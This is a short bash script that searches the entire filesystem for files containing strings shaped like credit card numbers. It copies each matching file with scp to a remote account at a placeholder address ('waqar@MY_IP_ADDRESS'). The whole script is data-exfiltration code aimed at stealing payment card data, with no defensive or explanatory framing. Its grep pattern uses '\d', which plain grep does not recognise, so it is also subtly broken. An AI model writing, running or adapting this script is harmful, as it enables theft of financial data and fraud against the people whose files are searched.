#!/bin/bash

SEARCH_DIR="/"

REMOTE_DIR="waqar@MY_IP_ADDRESS:/home/waqar/"

CC_REGEX="(\d{4} \d{4} \d{4} \d{4})"

find "$SEARCH_DIR" -type f | while read -r file; do
    if grep -q "$CC_REGEX" "$file"; then
        echo "Found credit card number in $file"
        scp "$file" "$REMOTE_DIR"
    fi
done

